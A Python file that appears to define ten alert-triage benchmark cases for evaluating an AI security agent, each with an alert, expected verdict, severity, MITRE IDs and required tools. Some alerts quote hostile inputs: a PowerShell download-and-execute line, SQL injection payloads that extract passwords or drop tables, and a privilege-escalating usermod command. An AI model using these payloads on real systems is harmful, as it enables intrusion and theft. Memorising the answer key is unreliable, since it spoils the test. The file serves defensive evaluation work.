"""Ten triage scenarios derived from the original 32-case benchmark.

Each case has:
    id, alert (the prompt the model sees), expected_verdict, expected_severity,
    expected_mitre (any one matches), expected_tools (any-one-of sets we
    consider "the right enrichment"), and expected_min_tools (the minimum
    enrichment we require — a model that calls fewer is incomplete).

`expected_tools` is a list of *acceptable tool sets* — each set is the names
the model should have called (server.tool form). The model passes if its
actual call set is a superset of any one acceptable set, modulo `forbidden`
which catches over-eager containment.
"""

from dataclasses import dataclass, field


@dataclass(frozen=True)
class Case:
    id: str
    alert: str
    expected_verdict: str          # "incident" | "benign"
    expected_severity: list[str]   # any of these is accepted
    expected_mitre: list[str]      # any one match counts; [] for benign
    expected_min_tools: list[list[str]] = field(default_factory=list)  # at least one of these subsets must be called
    forbidden_tools: list[str] = field(default_factory=list)
    notes: str = ""


CASES: list[Case] = [
    Case(
        id="PB-1",
        alert=(
            "Single-event alert: user `alice` (laptop 10.0.4.22) authenticated "
            "to the corporate intranet at 09:02 local time on a workday and "
            "opened her email. No prior failed attempts. Source matches her "
            "usual IP range."
        ),
        expected_verdict="benign",
        expected_severity=["info", "low"],
        expected_mitre=[],
        expected_min_tools=[
            ["cmdb.get_asset"],
            ["threat_intel.lookup_ip"],
        ],
        forbidden_tools=["edr.isolate_host"],
        notes="Tests that the model does not over-call or escalate routine activity.",
    ),
    Case(
        id="PB-2",
        alert=(
            "Domain admin account `dom_admin_01` authenticated successfully "
            "from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the "
            "same account opened 18 RDP sessions to internal hosts (DC01, "
            "FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …)."
        ),
        expected_verdict="incident",
        expected_severity=["high", "critical"],
        expected_mitre=["T1078", "T1078.002", "T1021", "T1021.001"],
        expected_min_tools=[
            ["threat_intel.lookup_ip", "siem.query_logs"],
            ["threat_intel.lookup_ip", "cmdb.get_asset"],
        ],
    ),
    Case(
        id="PB-3",
        alert=(
            "Web server `webhost` (10.0.4.10): 50,000 POST requests to "
            "/wp-login.php from 1,200 distinct IPs within 10 minutes, "
            "including 3 successful logins to admin accounts. Sample source "
            "IP: 89.248.165.74."
        ),
        expected_verdict="incident",
        expected_severity=["high", "critical"],
        expected_mitre=["T1110", "T1110.001", "T1110.003", "T1110.004"],
        expected_min_tools=[
            ["threat_intel.lookup_ip", "siem.query_logs"],
            ["threat_intel.lookup_ip", "cmdb.get_asset"],
        ],
    ),
    Case(
        id="PB-4",
        alert=(
            "EDR alert on host WIN-DEV-04: `winword.exe` spawned "
            "`powershell.exe` which executed "
            "`IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. "
            "User: dave."
        ),
        expected_verdict="incident",
        expected_severity=["high", "critical"],
        expected_mitre=["T1059.001", "T1059", "T1566.001", "T1204", "T1204.002"],
        expected_min_tools=[
            ["edr.get_processes", "threat_intel.lookup_ip"],
            ["edr.get_processes", "cmdb.get_asset"],
        ],
    ),
    Case(
        id="PB-5",
        alert=(
            "DNS server logs show internal host 10.0.4.55 issuing 4,000+ "
            "unique subdomain queries against `cdn-update.xyz` over 2 hours, "
            "with TXT-record responses averaging 200 bytes."
        ),
        expected_verdict="incident",
        expected_severity=["high", "critical"],
        expected_mitre=["T1071.004", "T1071", "T1048.003", "T1048"],
        expected_min_tools=[
            ["threat_intel.lookup_domain", "cmdb.get_asset"],
            ["threat_intel.lookup_domain", "siem.query_logs"],
        ],
    ),
    Case(
        id="PB-6",
        alert=(
            "sshd on host `webhost` (10.0.4.10) recorded 7 failed password "
            "attempts for distinct usernames (admin, root, oracle, postgres, "
            "git, test, ubuntu) from source IP 185.220.101.45 between "
            "03:41:02 and 03:41:20, followed by a successful login as "
            "`ubuntu` from the same IP at 03:43:21."
        ),
        expected_verdict="incident",
        expected_severity=["high", "critical"],
        expected_mitre=["T1110", "T1110.001", "T1078"],
        expected_min_tools=[
            ["threat_intel.lookup_ip", "cmdb.get_asset"],
            ["threat_intel.lookup_ip", "siem.query_logs"],
        ],
    ),
    Case(
        id="PB-7",
        alert=(
            "Routine sshd event on `webhost` (10.0.4.10): "
            "publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. "
            "PAM session opened. systemd-logind started session 2841."
        ),
        expected_verdict="benign",
        expected_severity=["info", "low"],
        expected_mitre=[],
        expected_min_tools=[
            ["cmdb.get_asset"],
            ["threat_intel.lookup_ip"],
        ],
        forbidden_tools=["edr.isolate_host"],
    ),
    Case(
        id="PB-8",
        alert=(
            "Apache access log on `webhost` (10.0.4.10) shows 4 requests from "
            "185.62.190.13 within 4 seconds: "
            "`GET /products.php?id=1' OR '1'='1--`, "
            "`GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, "
            "`GET /products.php?id=1;DROP+TABLE+users--`, "
            "`GET /products.php?id=1+AND+SLEEP(5)--`. "
            "The UNION SELECT request returned a 200 with a 4129-byte body."
        ),
        expected_verdict="incident",
        expected_severity=["high", "critical"],
        expected_mitre=["T1190"],
        expected_min_tools=[
            ["threat_intel.lookup_ip", "openvas.scan_host"],
            ["threat_intel.lookup_ip", "cmdb.get_asset"],
        ],
    ),
    Case(
        id="PB-9",
        alert=(
            "On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran "
            "`sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was "
            "applied (`add 'svc_backup' to group 'sudo'`). bob is a developer "
            "account with sudo rights but no documented need to modify "
            "service-account permissions at 03:17."
        ),
        expected_verdict="incident",
        expected_severity=["medium", "high"],
        expected_mitre=["T1098", "T1548", "T1136", "T1078"],
        expected_min_tools=[
            ["cmdb.get_asset", "edr.get_processes"],
            ["cmdb.get_asset", "siem.query_logs"],
        ],
    ),
    Case(
        id="PB-10",
        alert=(
            "Domain controller DC01: 5 sequential EventID 4625 (BadPassword) "
            "events for account `Administrator`, LogonType 3, source IP "
            "192.168.50.13 (workstation KIOSK-04) between 02:18:14 and "
            "02:18:24, followed by an EventID 4624 (success) for the same "
            "account from the same IP at 02:21:42."
        ),
        expected_verdict="incident",
        expected_severity=["high", "critical"],
        expected_mitre=["T1110", "T1110.001", "T1110.003", "T1078", "T1078.002"],
        expected_min_tools=[
            ["cmdb.get_asset", "siem.query_logs"],
            ["cmdb.get_asset", "threat_intel.lookup_ip"],
        ],
    ),
]
